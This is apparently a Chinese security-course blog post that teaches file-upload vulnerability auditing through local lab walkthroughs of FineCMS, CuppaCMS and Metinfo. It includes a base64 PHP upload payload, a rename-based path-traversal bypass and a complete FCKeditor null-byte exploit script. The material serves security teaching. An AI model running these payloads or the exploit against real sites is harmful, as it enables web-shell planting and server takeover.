![1645599921440-e0bbf90f-71b4-421c-bc26-0e1c657dbd41.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171546496-1956825319.png)

```plain
#知识点：
1、白盒审计三要素
2、黑盒审计四要素
3、白黑测试流程思路

#详细点：
1、检测层面：前端，后端等
2、检测内容：文件头，完整性，二次渲染等
3、检测后缀：黑名单，白名单，MIME检测等
4、绕过技巧：多后缀解析，截断，中间件特性，条件竞争等

#本章课程内容：
1、文件上传-CTF赛题知识点
2、文件上传-中间件解析&编辑器安全
3、文件上传-实例CMS文件上传安全分析

#前置：
后门代码需要用特定格式后缀解析，不能以图片后缀解析脚本后门代码(解析漏洞除外)
如：jpg图片里面有php后门代码，不能被触发，所以连接不上后门
如果要图片后缀解析脚本代码，一般会利用包含漏洞或解析漏洞，还有.user.ini&.htaccess

#文件上传：
黑盒：寻找一切存在文件上传的功能应用
1、个人用户中心是否存在文件上传功能
2、后台管理系统是佛存在文件上传功能
3、字典目录扫描探针文件上传构造地址
4、字典目录扫描探针编辑器目录构造地址

白盒：看三点，中间件，编辑器，功能代码
1、中间件直接看语言环境常见搭配
2、编辑器直接看目录机构或搜索关键字
3、功能代码直接看源码应用或搜索关键字
```

- 白盒审计-Finecms-代码常规-处理逻辑

```plain
黑盒思路：寻找上传点抓包修改突破获取状态码及地址
审计流程：功能点-代码文件-代码块-抓包调试-验证测试
黑盒角度：
进行页面分析，寻找上传点
注册账号，登上去发现有一个头像上传的地方
```

![1645600949940-c8484cdf-9087-4062-8dc5-fd11696f6770.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171641567-403122832.png)

```plain
尝试上传抓包，返回包获取
触发文件是：/index.php?s=member&c=account&m=upload&iajax=1
```

![1645601096521-68009bfd-366b-4ec1-8981-15070fb4a65f.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171641665-1546444147.png)

```plain
不做任何更改，直接发送数据包。点击图片地址：http://127.0.0.1:8100/uploadfile/member/3/45x45.jpeg
多测试图像，发现对原来的文件进行覆盖。
可以发现返回数据包1是成功的标志。
发现上传的数据包，即没有文件的名字，也没有文件的后缀名格式。
其实都在tx中
tx=data%3Aimage%2Fjpeg%3Bbase64%2C%2F9j%2F4AAQSkZJRgABAQEAYABgAAD%2F4SwsRXhpZgAATU0AKgAAAAgABgALAAIAAAAmAAAIYgESAAMAAAABAAEAAAExAAIAAAAmAAAIiAEyAAIAAAAUAAAIrodpAAQAAAABAAAIwuocAAcAAAgMAAAAVgAAEUYc6gAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
发现字符image/jpeg，后面是文件内容的编码base64
把后面的内容放在brup中进行base64解码 decode as 选择base64
```

![1645601628350-00674637-ef68-478e-99d8-1cf2f439ee89.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171640862-440767189.png)

```plain
对比之前图片的结果，是一模一样的。

常规类型的数据包有：
filename
type
上传数据

在这个文件上传中
type=data%3Aimage%2Fjpeg%3
上传数据是base64后面一长串
filename：但是没有看到上传的文件名

在黑盒上测试，那么就是修改type的值，然后再把内容进行编码发送。
先修改type类型，看返回的数据包
```

![1645602070197-b1c056ca-a9e6-48d4-9ae0-dd84dcb87bed.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171641295-1323850833.png)

```plain
发现返回代码{"status":0,"code":"\u4e0a\u4f20\u9519\u8bef\uff1a<p>Unable to save the image. Please make sure the image and file directory are writable.<\/p>","id":0} 也不知道有没有上传成功。
尝试访问http://127.0.0.1:8100/uploadfile/member/3/45x45.php，返回404
两个问题：1.没有成功上传 2.路径没有对

查看文件。发现是有这个php的，是路径错误，路径D:\phpstudy_pro\WWW\finecms_v5.0.6\uploadfile\member\3\0x0.php
访问http://127.0.0.1:8100/uploadfile/member/3/0x0.php才能触发这个代码。
base64编码<?php phpinfo();?>:PD9waHAgcGhwaW5mbygpOz8+
发送数据包，访问就可以触发这个上传漏洞。
```

![1645602638948-23beac12-7d2c-43fa-866a-5c9658c311ab.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171641997-911465494.png)

```plain
这个路径错误在黑盒上没办法知道的。

白盒分析代码：
抓包分析触发的文件/index.php?s=member&c=account&m=upload&iajax=1
这个地址类似于tp框架的触发地址，找文件名：finecms\dayrui\controllers\memer\Accout.php 方法名为upload
```

![1645603210249-cb99c6ec-a34e-4327-991e-2d6b2a9fc0b3.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171641422-145476545.png)

```plain
				$dir = SYS_UPLOAD_PATH.'/member/'.$this->uid.'/';
        @dr_dir_delete($dir);
        !is_dir($dir) && dr_mkdirs($dir);

        if ($_POST['tx']) {
            $file = str_replace(' ', '+', $_POST['tx']);
            if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result)){
                $new_file = $dir.'0x0.'.$result[2];
                if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) {
                    exit(dr_json(0, '目录权限不足或磁盘已满'));
                } else {
                    $this->load->library('image_lib');
                    $config['create_thumb'] = TRUE;
                    $config['thumb_marker'] = '';
                    $config['maintain_ratio'] = FALSE;
                    $config['source_image'] = $new_file;
                    foreach (array(30, 45, 90, 180) as $a) {
                        $config['width'] = $config['height'] = $a;
                        $config['new_image'] = $dir.$a.'x'.$a.'.'.$result[2];
                        $this->image_lib->initialize($config);
                        if (!$this->image_lib->resize()) {
                            exit(dr_json(0, '上传错误：'.$this->image_lib->display_errors()));
                            break;
                        }
                    }
                    list($width, $height, $type, $attr) = getimagesize($dir.'45x45.'.$result[2]);
                    !$type && exit(dr_json(0, '图片字符串不规范'));
                }
            } else {

                exit(dr_json(0, '图片字符串不规范'));
            }
        } else {
            exit(dr_json(0, '图片不存在'));
        }

// 上传图片到服务器
        if (defined('UCSSO_API')) {
            $rt = ucsso_avatar($this->uid, file_get_contents($dir.'90x90.jpg'));
            !$rt['code'] && $this->_json(0, fc_lang('通信失败：%s', $rt['msg']));
        }


        exit('1');
    }
    


dr_mkdirs函数声明：
function dr_mkdirs($dir) {
    if (!$dir) {
        return FALSE;
    }
    if (!is_dir($dir)) {
        dr_mkdirs(dirname($dir));
        if (!is_dir($dir)) {
            mkdir($dir, 0777);
        }
    }
}
if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result)){
                $new_file = $dir.'0x0.'.$result[2];
这个是关键性代码，通过preg_match去匹配，匹配的值给result，取result的值，如果上传php result的值应该就是php
然后进行写入，这个上传并没有任何过滤。
先来调试file的值，看看file的值是什么，加上代码：echo $file."<br>";
```

![1645603859231-6ee31ded-c0b2-461f-9da2-a9221765dfc5.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171641036-260928194.png)

```plain
发现file的值为data:image/php;base64,/9j/PD9waHAgcGhwaW5mbygpOz8+<br>
在来看new_file，$new_file = $dir.'0x0.'.$result[2];
发现new_file的值为：D:\phpstudy_pro\WWW\finecms_v5.0.6/uploadfile/member/3/0x0.php
可以得到result[2]=php
```

![1645604044788-c2a5c4a3-1609-4c24-bf95-2fa4e632f2ca.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171641369-391094404.png)

```plain
base64解码函数：if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file))))

产生地方：会员中心的头像上传地方
产生原因：自己写代码没有过滤
```

- 白盒审计-CuppaCms-中间件-.htaccess

```plain
黑盒思路：存在文件管理上传改名突破，访问后在突破
审计流程：功能点-代码文件-代码块-抓包调试-验证测试
一直安装不成功。所以没办法。
黑盒思路：
在file manager地方，有文件列表。
尝试上传php文件，返回结果为file type not allowed
上传jpg，抓包，返回数据包正常
上传jpg，抓包，修改为php，返回错误。但是有文件名，尝试访问一下文件名，发现404，还是没有。

尝试上传php5,.user.ini,txt等，发现自动改名，则.user.ini不能使用。
黑盒测试到这里，应该差不多要放弃了。

但是继续测试，发现了黑盒中有重命名的地方，那么就思考能不能把他重命名为php格式的后缀
重命名的时候，发现前端只能命名前面，不能命名后缀
抓包，发现能对重命名的后缀进行修改
关键代码：from = test.php.png to=test.php.png
这个后缀不能修改是在前端进行了限制。


修改，然后可以上传了php，然后访问地址。
但是发生了403错误。因为在网站源码下面有.htaccess，发现过滤了php文件等，被拒绝执行访问。对目录进行设置。

黑盒思路：1.把文件上传到其他目录  2.删除或者覆盖.htaccess文件，让他不生效（一般黑盒不知道是这个限制，只知道是对目录进行了限制，但是不知道是系统还是.htaccess限制）

1.把文件上传到其他目录
不要再子目录中上传，在子目录上传也会受到控制
把file.php改为../file.php

2.直接删除.htaccess（不能覆盖，因为有重命名）
白盒角度：

上传抓包上传，发现URL：js/jquery_file_upload/server/php/index.php
index.php代码:
ini_set('display_errors', "0");
error_reporting(E_ALL | E_STRICT);
require('UploadHandler.php');
$upload_handler = new UploadHandler();

找到UploadHandler.php，搜索关键字：file type not allowed
```

![1645611722756-50ff7bdd-b644-47c9-bad0-84a2e233f565.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171641140-628536711.png)

```plain
因为'accept_file_types' => 'Filetype not allowed',这段代码，所以继续跟踪'accept_file_types' 这个代码段
```

![1645612147022-a0748428-22c2-4385-82bc-ef74503eed4e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171641380-2010796751.png)

```plain
查看允许上传的后缀：
 'accept_file_types' => '/.('.$allowed_extensions.')$/i',
 
 跟踪$allowed_extensions，应该是在配置文件里生成
 全局搜索$allowed_extensions，在Configuration.php有声明
```

![1645612721065-e5c86ce2-a5a3-4425-a877-c10b04fedc32.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171641470-813965848.png)

```plain
public $allowed_extensions = "*.gif; *.jpg; *.jpeg; *.pdf; *.ico; *.png; *.svg;";
很明显，这个是白名单过滤。
重命名的数据包指向文件：js/filemanager/api/index.php
```

![1645613396286-5de85851-e8d6-4b98-8ac9-461945a4c3f4.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171641929-895788193.png)

```plain
发现这段代码没有任何过滤

那为什么在前端没有显示呢，找到相对应的HTML代码。全局搜索rename
```

![1645614308714-a7fec19b-2a64-4f2d-a473-3a3d01433165.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171641585-1317636585.png)

```plain
这个只是在前端进行限制，并没有在后端修改。
如果在接受只接受文件命名，固定了后缀，那么这个就没有漏洞。
```

- 白盒审计-Metinfo-编辑器引用-第三方安全

```plain
黑盒思路：探针目录利用编辑器漏洞验证测试
审计流程：目录结构-引用编辑器-编辑器安全查询-EXP利用验证
扫描得到fckeditor
http://127.0.0.1:8102/fckeditor/
然后在网上找利用点。
扫描获取版本路径：http://127.0.0.1:8102/fckeditor/editor/dialog/fck_about.html
```

![1645616127237-0ad99787-23d6-42d3-b432-fe3cef9fb02a.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171640905-955476986.png)

```plain
然后寻找网上fckeditor 2.6.3 exp


<?php
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
define(STDIN, fopen("php://stdin", "r"));
$match = array();
function http_send($host, $packet)
{
$sock = fsockopen($host, 80);
while (!$sock)
{
print "\n[-] No response from {$host}:80 Trying again...";
$sock = fsockopen($host, 80);
}
fputs($sock, $packet);
while (!feof($sock)) $resp .= fread($sock, 1024);
fclose($sock);
print $resp;
return $resp;
}
function connector_response($html)
{
global $match;
return (preg_match("/OnUploadCompleted\((\d),\"(.*)\"\)/", $html, $match) && in_array($match[1], array(0, 201)));
}
print "\n+------------------------------------------------------------------+";
print "\n| FCKEditor Servelet Arbitrary File Upload Exploit |";
print "\n+------------------------------------------------------------------+\n";
if ($argc < 3)
{
print "\nUsage......: php $argv[0] host path\n";
print "\nExample....: php $argv[0] localhost /\n";
print "\nExample....: php $argv[0] localhost /FCKEditor/\n";
die();
}
$host = $argv[1];
$path = ereg_replace("(/){2,}", "/", $argv[2]);
$filename = "fvck.gif";
$foldername = "fuck.php%00.gif";
$connector = "editor/filemanager/connectors/php/connector.php";
$payload = "-----------------------------265001916915724\r\n";
$payload .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"{$filename}\"\r\n";
$payload .= "Content-Type: image/jpeg\r\n\r\n";
$payload .= 'GIF89a'."\r\n".'xiaodi'."\n";
$payload .= "-----------------------------265001916915724--\r\n";
$packet = "POST {$path}{$connector}?Command=FileUpload&Type=Image&CurrentFolder=".$foldername." HTTP/1.0\r\n";//print $packet;
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Type: multipart/form-data; boundary=---------------------------265001916915724\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $payload;
print $packet;
if (!connector_response(http_send($host, $packet))) die("\n[-] Upload failed!\n");
else print "\n[-] Job done! try http://${host}/$match[2] \n";
?>

把他放在php.exe目录下运行
```

![1645616749644-10325128-68b9-4195-b0af-29aae0722636.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171641444-277405496.png)

```plain
但是尝试失败
可能是版本原因，要5.4一下的php版本，利用的是%00截断这个知识点
```

